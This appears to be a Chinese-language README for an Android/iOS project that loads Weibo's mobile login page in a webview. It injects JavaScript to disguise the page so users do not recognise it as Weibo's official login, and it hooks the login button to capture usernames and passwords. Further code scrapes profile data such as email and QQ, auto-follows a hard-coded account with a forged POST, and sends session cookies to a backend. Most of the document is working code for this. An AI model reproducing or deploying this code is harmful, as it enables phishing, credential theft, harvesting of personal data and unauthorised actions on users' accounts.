# appWeiboInfoCrawl
use webview let user to login Weibo,and the auto get user info(使用webview让用户授权登录微博，然后自动获取用户信息)


### weibo文件夹为android端代码，weiboios文件夹为ios端代码
# 项目目标
在app(ios和android)端使用webview组件与js进行交互，串改页面，让用户授权登录后，获取用户关键信息，并完成自动关注一个账号。
#  传统爬虫模式的局限
传统爬虫模式，让用户在客户端在输入账号密码，然后传送到后端进行登录，爬取信息，这种方式将要面对各种人机验证措施，加密方法复杂的情况下，还得选择selenium，性能更无法保证。同时，对于个人账户，安全措施越来越严，使用代理ip进行操作，很容易造成异地登录等问题，代理ip也很可能在全网被重复使用的情况下，被封杀，频繁的代理ip切换也会带来需要二次登录等问题。
所以这两年年来，发现市面上越来越多的提供sdk方式的数据提供商，经过抓包及反编译sdk，发现其大多数使用webview载入第三方页面的方式完成登录，有的在登录完成之后，获取cookie传送到后端完成爬取，有的直接在app内完成所需信息的收集。
# 登录
这是微博移动端登录页
![weibo原移动端登录页.png](http://upload-images.jianshu.io/upload_images/10280397-c258622a77703836.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
首先使用JavaScript串改当前页面元素，让用户没法意识到这是微博官方的登录页。
## 载入页面
android
```
webView.loadUrl(LOGINPAGEURL);
```
iOS
```
[self requestUrl:self.loginPageUrl];
//请求url方法
-(void) requestUrl:(NSString*) urlString{
    NSURL* url=[NSURL URLWithString:urlString];
    NSURLRequest* request=[NSURLRequest requestWithURL:url];
    [self.webView loadRequest:request];
}
```
## js代码注入
首先我们注入js代码到app的webview中
android
```
private void injectScriptFile(String filePath) {
        InputStream input;
        try {
            input = webView.getContext().getAssets().open(filePath);
            byte[] buffer = new byte[input.available()];
            input.read(buffer);
            input.close();
            // String-ify the script byte-array using BASE64 encoding
            String encoded = Base64.encodeToString(buffer, Base64.NO_WRAP);
            String funstr = "javascript:(function() {" +
                    "var parent = document.getElementsByTagName('head').item(0);" +
                    "var script = document.createElement('script');" +
                    "script.type = 'text/javascript';" +
                    "script.innerHTML = decodeURIComponent(escape(window.atob('" + encoded + "')));" +
                    "parent.appendChild(script)" +
                    "})()";
            execJsNoReturn(funstr);
        } catch (IOException e) {
            Log.e(TAG, "injectScriptFile: " + e);
        }
    }
```
iOS
```
//注入js文件
- (void) injectJsFile:(NSString *)filePath{
    NSString *jsPath = [[NSBundle mainBundle] pathForResource:filePath ofType:@"js" inDirectory:@"assets"];
    NSData *data=[NSData dataWithContentsOfFile:jsPath];
    NSString *responData =  [data base64EncodedStringWithOptions:0];
    NSString *jsStr=[NSString stringWithFormat:@"javascript:(function() {\
                     var parent = document.getElementsByTagName('head').item(0);\
                     var script = document.createElement('script');\
                     script.type = 'text/javascript';\
                     script.innerHTML = decodeURIComponent(escape(window.atob('%@')));\
                     parent.appendChild(script)})()",responData];
    [self.webView evaluateJavaScript:jsStr completionHandler:^(id _Nullable htmlStr,NSError * _Nullable error){
        
    }];
}
```
我们都采用读取js文件，然后base64编码后，使用window.atob把其做为一个脚本注入到当前页面(注意：window.atob处理中文编码后会得到的编码不正确，需要使用ecodeURIComponent escape来进行正确的校正。)
在这里已经使用了app端，调用js的方法来创建元素。
## app端调用js方法
android端：
```
webView.evaluateJavascript(funcStr, new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {

            }

        });
```
ios端：
```
[self.webView evaluateJavaScript:funcStr completionHandler:^(id _Nullable htmlStr,NSError * _Nullable error){
        
    }];
```
这两个方法可以获取返回值，正因为如此，可以使用js提取页面信息后，返回给webview，然后收集信息完成之后，汇总进行通信。
# js串改页面
 ```
//串改页面元素，让用户以为是授权登录
function getLogin(){
  var topEle=selectNode('//*[@id="avatarWrapper"]');
  var imgEle=selectNode('//*[@id="avatarWrapper"]/img');
  topEle.remove(imgEle);
  var returnEle=selectNode('//*[@id="loginWrapper"]/a');
  returnEle.className='';
  returnEle.innerText='';
  pEle=selectNode('//*[@id="loginWrapper"]/p');
  pEle.className="";
  pEle.innerHTML="";
  footerEle=selectNode('//*[@id="loginWrapper"]/footer');
  footerEle.innerHTML="";
  var loginNameEle=selectNode('//*[@id="loginName"]');
  loginNameEle.placeholder="请输入用户名";
  var buttonEle=selectNode('//*[@id="loginAction"]');
  buttonEle.innerText="请进行用户授权";
  selectNode('//*[@id="loginWrapper"]/form/section/div[1]/i').className="";
  selectNode('//*[@id="loginWrapper"]/form/section/div[2]/i').className="";
  selectNode('//*[@id="loginAction"]').className="btn";
  selectNode('//a[@id="loginAction"]').addEventListener('click',transPortUnAndPw,false);
  return window.webkit;
}
function transPortUnAndPw(){
  username=selectNode('//*[@id="loginName"]').value;
  pwd=selectNode('//*[@id="loginPassword"]').value;
  window.webkit.messageHandlers.getInfo({body:JSON.stringify({"username":username,"pwd":pwd})});
}
```
使用js修改页面元素，使之看起来不会让人发觉这是weibo官方的页面。
修改后的页面如图：
![修改后登录页面.png](http://upload-images.jianshu.io/upload_images/10280397-c2b2aee8b46a2417.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
# 串改登录点击事件，获取用户名密码

```
selectNode('//a[@id="loginAction"]').addEventListener('click',transPortUnAndPw,false);
function transPortUnAndPw(){
  username=selectNode('//*[@id="loginName"]').value;
  pwd=selectNode('//*[@id="loginPassword"]').value;
  window.webkit.messageHandlers.getInfo({body:JSON.stringify({"username":username,"pwd":pwd})});
}
```
同时串改登录点击按钮，通过js调用app webview的方法，把用户名和密码传递给app webview 完成信息收集。
## js调用webview的方法
android端：
```
// js代码
window.weibo.getPwd(JSON.stringify({"username":username,"pwd":pwd}));
//Java代码
webView.addJavascriptInterface(new WeiboJsInterface(), "weibo");
public class WeiboJsInterface {
        @JavascriptInterface
        public void getPwd(String returnValue) {
            try {
                unpwDict = new JSONObject(returnValue);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
```
android通过实现一个@JavaScriptInterface接口，把这个方法添加类添加到webview的浏览器内核之上，当调用这个方法时，会触发android端的调用。
ios端：
```
//js代码
window.webkit.messageHandlers.getInfo({body:JSON.stringify({"username":username,"pwd":pwd})});
//oc代码
WKUserContentController *userContentController = [[WKUserContentController alloc] init];
 [userContentController addScriptMessageHandler:self name:@"getInfo"];

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message
{
    
    self.unpwDict=[self getReturnDict:message.body];
}
```
ios方式，实现方式与此类似，不过由于我对oc以及ios开发不熟悉，代码运行不符合期望,希望专业的能指正。
# 个人信息获取
## 直接提取页面的难点
webview这个组件，无论是在android端 onPageFinished方法还是ios端的didFinishNavigation方法，都无法正确判定页面是否加载完全。所以对于很多页面，还是选择走接口
# 请求接口
本项目中，获取用户自己的微博，关注，和分析，都是使用接口，拿到预览页，直接解析数，对于关键的参数，需要仔细抓包获取
![抓包1.png](http://upload-images.jianshu.io/upload_images/10280397-b14b37bd91c4ab4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
仔细分析 “我”这个标签下的请求情况，发现https://m.weibo.cn/home/me?format=cards这个链接包含用户核心数据，通过这个请求，获取核心参数，然后，获取用户的微博 关注 粉丝的预览页面。
然后通过
```
JSON.stringify(JSON.parse(document.getElementsByTagName('pre')[0].innerText))
```
获取json字符串，并传到app端进行解析。
解析及多次请求的逻辑

# 请求页面
也有页面，如个人资料，页面较简单，可以使用js提取
### js代码
```
function getPersonInfo(){
  var name=selectNodeText('//*[@id="J_name"]');
  var sex=selectNodeText('/*[@id="sex"]/option[@selected]');
  var location=selectNodeText('//*[@id="J_location"]');
  var year=selectNodeText('//*[@id="year"]/option[@selected]');
  var month=selectNodeText('//*[@id="month"]/option[@selected]');
  var day=selectNodeText('//*[@id="day"]/option[@selected]');
  var email=selectNodeText('//*[@id="J_email"]');
  var blog=selectNodeText('//*[@id="J_blog"]');
  if(blog=='输入博客地址'){
    blog='未填写';
  }
  var qq=selectNodeText('//*[@id="J_QQ"]');
  if(qq=='QQ帐号'){
    qq="未填写";
  }
  birthday=year+'-'+month+'-'+day;
  theDict={'name':name,'sex':sex,'localtion':location,'birthday':birthday,'email':email,'blog':blog,'qq':qq};
  return JSON.stringify({'personInfomation':theDict});
}
```
由于webview不支持 $x 的xpath写法，为了方便，使用原生的XPathEvaluator, 实现了特定的提取。
```
function selectNodes(sXPath) {
  var evaluator = new XPathEvaluator();
  var result = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (result != null) {
    var nodeArray = [];
    var nodes = result.iterateNext();
    while (nodes) {
      nodeArray.push(nodes);
      nodes = result.iterateNext();
    }
    return nodeArray;
  }
  return null;
};
//选取子节点
function selectChildNode(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    return newNode;
  }
}

function selectChildNodeText(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode != null) {
      return newNode.textContent.replace(/(^\s*)|(\s*$)/g, ""); ;
    } else {
      return "";
    }
  }
}

function selectChildNodes(sXPath, element) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, element, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var nodeArray = [];
    var newNode = newResult.iterateNext();
    while (newNode) {
      nodeArray.push(newNode);
      newNode = newResult.iterateNext();
    }
    return nodeArray;
  }
}

function selectNodeText(sXPath) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode) {
      return newNode.textContent.replace(/(^\s*)|(\s*$)/g, ""); ;
    }
    return "";
  }
}
function selectNode(sXPath) {
  var evaluator = new XPathEvaluator();
  var newResult = evaluator.evaluate(sXPath, document, null, XPathResult.ANY_TYPE, null);
  if (newResult != null) {
    var newNode = newResult.iterateNext();
    if (newNode) {
      return newNode;
    }
    return null;
  }
}
```
# 自动关注用户
由于个人微博页面 onPageFinished与didFinishNavigation这两个方法无法判定页面是否加载完全，
为了解决这个问题，在android端，使用拦截url，判定页面加载图片的数量来确定，是否，加载完全
```
//由于页面的正确加载onPageFinieshed和onProgressChanged都不能正确判定，所以选择在加载多张图片后，判定页面加载完成。
            //在这样的情况下，自动点击元素，完成自动关注用户。
            @Override
            public void onLoadResource(WebView view, String url) {
                if (webView.getUrl().contains(AUTOFOCUSURL) && url.contains("jpg")) {
                    newIndex++;
                    if (newIndex == 5) {
                        webView.post(new Runnable() {
                            @Override
                            public void run() {
                                injectJsUseXpath("autoFocus.js");
                                execJsNoReturn("autoFocus();");
                            }
                        });
                    }
                }
                super.onLoadResource(view, url);
            }
```
js 自动点击
```
function autoFocus(){
  selectNode('//span[@class="m-add-box"]').click();
}
```
在ios端，使用访问接口的方式
![抓包2.png](http://upload-images.jianshu.io/upload_images/10280397-d3ed5bcb8c443191.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
除了目标用户的id外，还有一个st字符串，通过chrome的search，定位，然后通过js提取
```
function getSt(){
  return config['st'];
}
```
然后构造post，请求，完成关注
```
- (void) autoFocus:(NSString*) st{
    //Wkwebview采用js模拟完成表单提交
    NSString *jsStr=[NSString stringWithFormat:@"function post(path, params) {var method = \"post\"; \
                     var form = document.createElement(\"form\"); \
                     form.setAttribute(\"method\", method); \
                     form.setAttribute(\"action\", path); \
                     for(var key in params) { \
                     if(params.hasOwnProperty(key)) { \
                     var hiddenField = document.createElement(\"input\");\
                     hiddenField.setAttribute(\"type\", \"hidden\");\
                     hiddenField.setAttribute(\"name\", key);\
                     hiddenField.setAttribute(\"value\", params[key]);\
                     form.appendChild(hiddenField);\
                     }\
                     }\
                     document.body.appendChild(form);\
                     form.submit();\
                     }\
                     post('https://m.weibo.cn/api/friendships/create',{'uid':'1195242865','st':'%@'});",st];
    [self execJsNoReturn:jsStr];
}
```
ios WkWebview没有post请求，接口，所以构造一个表单提交，完成post请求。
完成，一个自动关注，当然，构造一个用户id的列表，很简单就可以实现自动关注多个用户。
# 关于cookie
如果需要爬取的数据量大，可以选择爬取少量关键信息后，把cookie传到后端处理
android 端 cookie处理
```
CookieSyncManager.createInstance(context);  
CookieManager cookieManager = CookieManager.getInstance(); 
```
通过cookieManage对象可以获取cookie字符串，传送到后端，继续爬取

ios端cookie处理
```
NSDictionary *cookie = [AppInfo shareAppInfo].userModel.cookies;
```
处理方式与android端类似。





